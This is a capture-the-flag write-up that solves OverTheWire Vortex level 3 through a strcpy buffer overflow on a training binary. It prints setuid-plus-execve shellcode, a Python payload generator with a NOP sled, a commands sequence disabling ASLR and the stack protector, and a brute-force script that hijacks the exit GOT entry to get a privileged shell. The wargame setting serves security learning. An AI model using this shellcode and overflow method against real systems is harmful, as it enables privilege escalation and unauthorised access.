---
title:  "[CTF] OverTheWire Vortex Level 3"
categories: [CTF, OverTheWire]
---

![Logo](/assets/images/vortex3.png)

## Context

As mentioned in the description, [level 3](http://overthewire.org/wargames/vortex/vortex3.html) is a little bit tricky. We see that we'll have to place the shellcode in the _`buf`_ variable using _`strcpy`_ and the shellcode will require a setuid (LEVEL4_UID), since bash drops effective privileges.

## Test a setuid + execve shellcode

I've taken a shellcode that does exactly this from [here](https://pastebin.com/r5gGpSan), and test it from a wrapper C function:
```c
/* 32 bytes setuid(0) + execve("/bin/sh",["/bin/sh",NULL]); */
char shellcode[] =
  "\x6a\x17"              // push $0x17
  "\x58"                  // pop  %eax
  "\x31\xdb"              // xor  %ebx, %ebx
  "\xcd\x80"              // int  $0x80
 
  "\x31\xd2"              // xor  %edx, %edx  
  "\x6a\x0b"              // push $0xb
  "\x58"                  // pop  %eax
  "\x52"                  // push %edx
  "\x68\x2f\x2f\x73\x68"  // push $0x68732f2f
  "\x68\x2f\x62\x69\x6e"  // push $0x6e69622f
  "\x89\xe3"              // mov  %esp, %ebx
  "\x52"                  // push %edx
  "\x53"                  // push %ebx
  "\x89\xe1"              // mov  %esp, %ecx
  "\xcd\x80";             // int  $0x80
 
int main() {
 int (*func)();
 func = (int (*)()) shellcode;
 (int)(*func)();
 
 return 0;
}
```

Let's compile and test: 
```bash
# gcc test_shell3.c -o test_shell
# ./test_shell 
sh-4.1# 
```

## Bypass StackGuard
[This article](http://phrack.org/issues/56/5.html#article) from PHRACK magazine describes a bypass method for a situation similar with ours. The idea is that by overflowing _`buf`-, we can modify _`lpp`_, and with this code
```c
**lpp = (unsigned long) &buf;
```
we can place the beginning of the buffer in an address referred to by an address we can control - there's a double indirection. Let's try to modify the flow with this method, by changing the destructor function, called in the last line of code (_`exit(0);`_). To find the address of the destructors:

```bash
vortex3@melissa:/vortex$ objdump -s -j .dtors vortex3
 
vortex3:     file format elf32-i386
 
Contents of section .dtors:
 804953c ffffffff 00000000                    ........      
```

As described [here](http://www.overthewire.org/wargames/vortex/readingmaterial/dtors.txt), the layout of the destructors section is as follows:
```
0xffffffff <function address> <another function address> ... 0x00000000 
```

So we will change the address of the first function to be called (_`0x08049540`_). We need an address to put in the _`lpp`_ pointer, and that address to point to 0x08049540:
```bash
$ gdb vortex3
(gdb) set disassembly-flavor intel
(gdb) disassemble __do_global_dtors_aux 
Dump of assembler code for function __do_global_dtors_aux:
[..]
   0x08048360 <+16>: mov    eax,ds:0x8049644
   0x08048365 <+21>: mov    ebx,0x8049540
   0x0804836a <+26>: sub    ebx,0x804953c
[..]
(gdb) x/x 0x08048366
0x8048366 <__do_global_dtors_aux>: 0x08049540
```

We find 0x08048366, that points to _`08049540`_ (first destructor function). If we manage to place _`0x08048366`_ in the _`lpp`_ pointer (by overflowing buf), the double indirection will add the code in buf variable to be executed as a destructor:
```
**lpp = (unsigned long) &buf
```

## Find lpp offset
We'll build the vortex3 source code locally, with added prints to track _`lpp`_ value after overflowing _`buf`_. To reproduce the environment in the vortex labs, we need to disable ASLR (Address Space Layout Randomization) and compile without stack protector:
```bash
# echo 0 > /proc/sys/kernel/randomize_va_space
# gcc -fno-stack-protector -U_FORTIFY_SOURCE vortex3.c -o vortex3
```

From a Python wrapper, we'll pass the previous shellcode and watch if we set correctly `lpp`_ variable after strcpy: 
```python
import sys
 
shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52" + \
        "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" + \
        "\x89\xe1\xcd\x80"
 
NOP = "\x90"
 
if __name__=="__main__":
    if len(sys.argv) > 1 :
        addr = sys.argv[1]
    else:
        addr = "\x41\x42\x43\x44"
 
    # number of NOP needed to overflow exactly the lpp variable
    # may be different than this one for vortex labs binary 
    print shellcode + NOP * (128-len(shellcode))  + addr
```    

And we see we can control lpp: 
```bash
# ./vortex3 `python L3.py`
lpp before: 0x804a024
lpp after: 0x44434241
```
For the vortex3 binary on vortex labs, there will be a difference (of 4 bytes) on the length of NOP sled needed. That's because the position of the _`lpp`_ variable on the stack differs by 4 bytes. On Vortex labs:
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080483d4 <+0>: push   ebp
   0x080483d5 <+1>: mov    ebp,esp
   0x080483d7 <+3>: and    esp,0xfffffff0
   0x080483da <+6>: sub    esp,0xa0
   0x080483e0 <+12>: mov    DWORD PTR [esp+0x9c],0x804963c
   ...
(gdb) x/x 0x804963c
0x804963c <lp>: 0x08049638
```
And locally we have: 
```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048484 <+0>: push   ebp
   0x08048485 <+1>: mov    ebp,esp
   0x08048487 <+3>: and    esp,0xfffffff0
   0x0804848a <+6>: sub    esp,0xa0
   0x08048490 <+12>: mov    DWORD PTR [esp+0x98],0x804a024
   [..]
(gdb) x/x 0x804a024
0x804a024 <lp>: 0x0804a020
```

So, on the Vortex labs machine we'll create a Python wrapper file in _`tmp`_ folder, taking into account the NOP sled difference:
```python
import sys
 
shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52" + \
        "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" + \
        "\x89\xe1\xcd\x80"
 
NOP = "\x90"
 
if __name__=="__main__":
    if len(sys.argv) > 1 :
        addr = sys.argv[1]
    else:
        addr = "\x41\x42\x43\x44"
 
    # number of NOP needed to overflow exactly the lpp variable
    # may be different than this one for vortex labs binary 
    print shellcode + NOP * (128-len(shellcode) + 4)  + addr
```

But, when trying to exploit, we get a segmentation fault: 
```bash
$ ./vortex3 `python /tmp/myv3.py`
Segmentation fault
```

That may be because of the subtle reason mentioned on the level description: **_ctors/dtors might no longer be writable_**. Older solutions present online worked because the level was compiled with another gcc version, and overwriting _`.dtors`_ as suggested in the reading was possible back then. Anyway, the author of the level gives a suggestion for solving this: **_an intelligent bruteforce_**.

## Python brute-forcer
We will only brute force a small part of the address space (16 bytes), because the first 2 bytes of _`lpp`_ we already know that must be _`0x0804`_. With the following Python wrapper we'll generate payloads and pass them to _`vortex3`_ binary until we find a shell.  The _`p.wait()`_ function stops and wait until the program finish executing (in our case the new shell).
```python
import subprocess
 
# shellcode generating  script
script = "/tmp/myv3.py"
 
#found good addr = "\x8c\x92\x04\x08"
 
# Brute force the second part of the address space
for i in range (1, 256):
    for j in range (1, 256):
        addr = "%c%c\x04\x08" % (chr(i), chr (j))
        print "Trying addr: ", "".join('\\x%02x' % ord(c) for c in addr)
         
        # payload = shellcode + addr 
        # payload = `python /tmp/myv3.py "\x41\x42\x43\x44"`
        payload = subprocess.check_output(["python", script, addr])
 
        # pipe = os.popen("cmd", 'r', bufsize)
        p = subprocess.Popen(['/vortex/vortex3', payload])
         
        # block for successful shell
        p.wait()
```

<div class="box-note">
  <i>i</i> and <i>j</i> variables <b>go from 1, not from 0</b>, because 0 is the null character and is not accepted in a shell command, and thus not accepted  by the <i>check_output()</i> function which executes a command.
</div>

The result of running the script:
```bash
vortex3@melissa:~$ python /tmp/wrapv3.py
[..]
Trying addr:  \x8c\x91\x04\x08
Trying addr:  \x8c\x92\x04\x08
$ id
uid=5003(vortex3) gid=5003(vortex3) euid=5004(vortex4) groups=5004(vortex4),5003(vortex3)
$ cat /etc/vortex_pass/vortex4
*******
```

So we got a correct address that, when put into _`lpp`_, runs our shellcode - _`\x08\x04\x92\x8c`_.  To understand what happened, we can check the address in gdb:
```bash
$ gdb /vortex/vortex3
(gdb) break main
Breakpoint 1 at 0x80483d7
(gdb) run
Starting program: /vortex/vortex3
 
Breakpoint 1, 0x080483d7 in main ()
(gdb) x/x 0x0804928c
0x804928c: 0x0804962c
(gdb) x/x 0x0804962c
0x804962c <_global_offset_table_>: 0x0804830a
(gdb) x/x 0x0804830a
0x804830a <exit@plt+6>: 0x00001868
```

So we've actually overwritten the _`exit`_ function in the _`.plt`_ section. This was a nice exercise, at least:) All the scripts mentioned are available [here](https://github.com/livz/otw-vortex).
